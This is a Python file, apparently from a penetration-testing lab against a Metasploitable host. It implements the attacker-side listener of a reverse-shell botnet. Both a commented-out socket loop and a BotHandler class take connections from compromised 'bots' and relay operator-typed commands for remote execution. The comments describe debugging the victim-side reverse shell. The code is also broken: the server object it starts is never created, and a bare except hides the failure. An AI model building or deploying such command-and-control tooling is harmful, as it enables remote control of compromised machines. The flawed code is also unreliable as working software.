import socketserver 
from socket import *

#The following are holdovers from shellServer.py:
#It's possible that running these messes with the multiServer?
'''
serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)


print("Attacker box listening and awaiting instructions")
connectionSocket, addr = serverSocket.accept()

print("Thanks for connecting to me " + str(addr))
message = connectionSocket.recv(1024)

print(message)
command =""

while command != "exit":
        command = input("Please enter a command: ")
        connectionSocket.send(command.encode())
        message = connectionSocket.recv(1024).decode()
        print(message)

connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()
'''

class BotHandler(socketserver.BaseRequestHandler):

	def handle(self):
		self.data = self.request.recv(1024).strip()
		print("Bot with IP {} sent:".format(self.client_address[0]))
		print(self.data)
		#Now, let's figure out how to get it to send commands instead!
		command =""
		command = input("Please enter a command: ")
		self.request.sendall(command.encode())
		message = self.request.recv(1024).strip()	
		print(message)

		#THIS IS WHERE THE ISSUE IS!
		#This just sends all the received data back in uppercase
		#So reverseShell on metasploitable is trying to run the
		# command "BOT REPORTING FOR DUTY" which obviously isn't
		# a valid command, causing a crash!
		#self.request.sendall(self.data.upper())

if __name__ == "__main__":
	HOST, PORT = "192.168.1.101", 8000

	# This line should remove an error that occurs when we try to reopen the socket quickly after closing it 
	socketserver.TCPServer.allow_reuse_address = True

	print("TCP Server enabled!")
	try:
		tcpServer.serve_forever()
	except:
		print("There was an error")
